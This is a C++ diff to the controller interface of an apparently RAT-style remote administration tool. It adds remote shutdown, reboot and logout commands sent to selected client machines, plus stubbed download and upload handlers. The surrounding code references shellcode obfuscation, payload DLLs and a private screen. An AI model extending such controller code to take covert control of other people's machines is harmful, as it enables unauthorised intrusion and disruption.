@@ -50,6 +50,7 @@
 #define UM_ICONNOTIFY WM_USER+100
 #define TIMER_CHECK 1
 #define TIMER_CLOSEWND 2
+#define TODO_NOTICE MessageBoxA("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
 
 typedef struct {
     const char*   szTitle;     //列表的名称
@@ -356,6 +357,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
     m_bmOnline[14].LoadBitmap(IDB_BITMAP_ADMINRUN);
     m_bmOnline[15].LoadBitmap(IDB_BITMAP_UNINSTALL);
     m_bmOnline[16].LoadBitmap(IDB_BITMAP_PDESKTOP);
+    m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
 
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         m_ServerDLL[i] = nullptr;
@@ -486,6 +488,12 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_PRIVATE_SCREEN, &CMy2015RemoteDlg::OnOnlinePrivateScreen)
     ON_NOTIFY(TCN_SELCHANGE, IDC_GROUP_TAB, &CMy2015RemoteDlg::OnSelchangeGroupTab)
     ON_COMMAND(ID_OBFS_SHELLCODE, &CMy2015RemoteDlg::OnObfsShellcode)
+    ON_COMMAND(ID_ONLINE_REGROUP, &CMy2015RemoteDlg::OnOnlineRegroup)
+    ON_COMMAND(ID_MACHINE_SHUTDOWN, &CMy2015RemoteDlg::OnMachineShutdown)
+    ON_COMMAND(ID_MACHINE_REBOOT, &CMy2015RemoteDlg::OnMachineReboot)
+    ON_COMMAND(ID_EXECUTE_DOWNLOAD, &CMy2015RemoteDlg::OnExecuteDownload)
+    ON_COMMAND(ID_EXECUTE_UPLOAD, &CMy2015RemoteDlg::OnExecuteUpload)
+    ON_COMMAND(ID_MACHINE_LOGOUT, &CMy2015RemoteDlg::OnMachineLogout)
 END_MESSAGE_MAP()
 
 
@@ -1477,6 +1485,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
     Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
+    Menu.SetMenuItemBitmaps(ID_ONLINE_REGROUP, MF_BYCOMMAND, &m_bmOnline[17], &m_bmOnline[17]);
 
     std::string masterHash(GetMasterHash());
     if (GetPwdHash() != masterHash || m_superPass.empty()) {
@@ -3368,4 +3377,54 @@ void CMy2015RemoteDlg::OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult)
     LeaveCriticalSection(&m_cs);
 
     *pResult = 0;
+}
+
+
+void CMy2015RemoteDlg::OnOnlineRegroup()
+{
+    TODO_NOTICE;
+}
+
+
+void CMy2015RemoteDlg::MachineManage(MachineCommand type) {
+	if (MessageBoxA("此操作需客户端具有管理员权限，确定继续吗? ", "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+		EnterCriticalSection(&m_cs);
+		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+		while (Pos) {
+			int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+			context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+            BYTE token[32] = { TOKEN_MACHINE_MANAGE, type };
+			ContextObject->Send2Client(token, sizeof(token));
+		}
+		LeaveCriticalSection(&m_cs);
+	}
+}
+
+void CMy2015RemoteDlg::OnMachineLogout()
+{
+    MachineManage(MACHINE_LOGOUT);
+}
+
+
+void CMy2015RemoteDlg::OnMachineShutdown()
+{
+    MachineManage(MACHINE_SHUTDOWN);
+}
+
+
+void CMy2015RemoteDlg::OnMachineReboot()
+{
+    MachineManage(MACHINE_REBOOT);
+}
+
+
+void CMy2015RemoteDlg::OnExecuteDownload()
+{
+    TODO_NOTICE;
+}
+
+
+void CMy2015RemoteDlg::OnExecuteUpload()
+{
+    TODO_NOTICE;
 }
